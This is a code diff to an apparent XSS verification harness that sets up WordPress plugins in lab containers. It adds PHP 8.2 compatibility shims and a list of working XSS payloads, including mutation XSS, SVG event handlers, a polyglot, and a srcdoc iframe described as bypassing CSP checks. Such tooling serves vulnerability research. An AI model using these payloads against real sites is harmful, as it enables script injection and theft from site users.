@@ -1757,6 +1757,53 @@ class _Lab:
                         patched = (patched[:_nl2 + 1]
                                    + "\n@ini_set('display_errors','0');\n"
                                    + patched[_nl2 + 1:])
+            # 7) PHP 8.2 deprecated ${var} string interpolation → {$var}.
+            #    "Hello ${name}" is a deprecation warning in 8.2 and breaks JSON in some envs.
+            import re as _re
+            patched = _re.sub(r'\$\{([A-Za-z_]\w*)\}', r'{$\1}', patched)
+            # 8) PHP 8.2 removed utf8_encode()/utf8_decode() — replace with mb_convert_encoding.
+            #    Some plugins call these on ASCII strings where the replacement is equivalent.
+            if 'utf8_encode(' in patched:
+                patched = patched.replace(
+                    'utf8_encode(', 'mb_convert_encoding(')
+                # mb_convert_encoding takes (string, to, from) — add charset args after first arg
+                # Simple: replace `mb_convert_encoding(X)` → `mb_convert_encoding(X,"UTF-8","ISO-8859-1")`
+                patched = _re.sub(
+                    r'mb_convert_encoding\(([^,)]+)\)',
+                    r'mb_convert_encoding(\1,"UTF-8","ISO-8859-1")',
+                    patched)
+            if 'utf8_decode(' in patched:
+                patched = patched.replace('utf8_decode(', '_binoracle_utf8_decode(')
+                if '_binoracle_utf8_decode' not in patched[:100]:
+                    _php_open3 = patched.find('<?php')
+                    if _php_open3 != -1:
+                        _nl3 = patched.find('\n', _php_open3)
+                        if _nl3 != -1:
+                            _helper = ("\nfunction _binoracle_utf8_decode($s){"
+                                       "return mb_convert_encoding($s,'ISO-8859-1','UTF-8');}\n")
+                            patched = patched[:_nl3 + 1] + _helper + patched[_nl3 + 1:]
+            # 9) mb_* soft-shim: if mbstring is not available in the lab container, the lab
+            #    will fatally fail on mb_strlen etc. Add a compatibility shim file into the
+            #    lab only when the plugin uses mb_* functions.
+            #    We handle it by injecting a require_once of the shim at the top of the main
+            #    plugin file — the shim is written separately by _build_mb_shim().
+            if ('* Plugin Name:' in patched or '* Plugin Name :' in patched):
+                _mb_calls = _re.findall(r'\bmb_(?:strlen|substr|strpos|strrpos|strtolower|'
+                                        r'strtoupper|convert_encoding|detect_encoding|'
+                                        r'internal_encoding|ereg|eregi)\s*\(', patched)
+                if _mb_calls:
+                    _php_open4 = patched.find('<?php')
+                    if _php_open4 != -1:
+                        _nl4 = patched.find('\n', _php_open4)
+                        if _nl4 != -1 and "if(!extension_loaded('mbstring'))" not in patched[:800]:
+                            _shim = ("\nif(!extension_loaded('mbstring')){function mb_strlen"
+                                     "($s,$e=''){return strlen($s);}function mb_substr($s,$st,"
+                                     "$l=null,$e=''){return $l===null?substr($s,$st):"
+                                     "substr($s,$st,$l);}function mb_strpos($h,$n,$o=0,$e='')"
+                                     "{return strpos($h,$n,$o);}function mb_strtolower($s,"
+                                     "$e=''){return strtolower($s);}function mb_strtoupper($s,"
+                                     "$e=''){return strtoupper($s);}}\n")
+                            patched = patched[:_nl4 + 1] + _shim + patched[_nl4 + 1:]
             return patched.encode("utf-8", errors="replace") if patched != text else src_bytes
 
         with tarfile.open(fileobj=buf, mode="w") as tf:
@@ -9881,6 +9928,20 @@ def verify_wordpress_xss(
             f"<img src=x onerror=&#34;{js}&#34;>",
             f"<svg/onload=\"{js}\">",
             f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
+            # mutation XSS (mXSS) — parsers that re-serialize innerHTML can execute these
+            # even when a simple text search would miss them
+            f"<noscript><p title=\"</noscript><img src=x onerror='{js}'>\">",
+            f"<svg><animate onbegin=\"{js}\" attributeName=x dur=1s>",
+            f"<svg><set attributeName=href from='' to=\"javascript:{js}\" begin=0s>",
+            f"<math><mtext></table></math><img src=x onerror=\"{js}\">",
+            # DOM-sink polyglot — works in innerHTML/document.write even after tag stripping
+            f"javascript:/*--></title></style></textarea></script></xmp><svg/onload=\"{js}\">",
+            # hash-fragment injection — DOM XSS via location.hash → innerHTML
+            f"#<img src=x onerror=\"{js}\">",
+            # template-literal / ES6 context break
+            f"`${{String.fromCharCode(60)}}script${{{js}}}${{String.fromCharCode(60)}}/script>",
+            # srcdoc iframe — bypasses src-based CSP checks
+            f"<iframe srcdoc='<script>{js}</script>'>",
         ]
         # ademas de los anteriores (rotura de contexto elegida a mano), TODAS las variantes
         # generalizables de xss_alert_identifiable.txt en PayloadsAllTheThings (cientos de
@@ -10295,6 +10356,19 @@ def verify_wordpress_xss(
                                     f"the script injected via '{xss_param}' (payload "
                                     f"#{_winner_idx}), changing document.title to marker."),
                                 "png_b64": png, "url": boot.base_url + stored_xss_view_path})
+                        # second-pass: check if stored payload also renders on the public front page
+                        # (proves impact extends beyond admin panel — attacker-visible pages)
+                        try:
+                            _fp = boot.sub_sess.get(boot.base_url + "/", timeout=10)
+                            _fp2 = boot.sub_sess.get(boot.base_url + "/?p=1", timeout=10)
+                            _winner_text = _winner[:80] if _winner else ""
+                            _fp_hit = (_winner_text and
+                                       (_winner_text in _fp.text or _winner_text in _fp2.text))
+                            res.evidence["stored_rendered_public"] = _fp_hit
+                            if _fp_hit:
+                                res.evidence["stored_rendered_url"] = boot.base_url + "/"
+                        except Exception:
+                            pass
 
         # ── MODO 1: Reflected / same-response ───────────────────────────────────────────────
         if not found and not stored_xss_view_path:
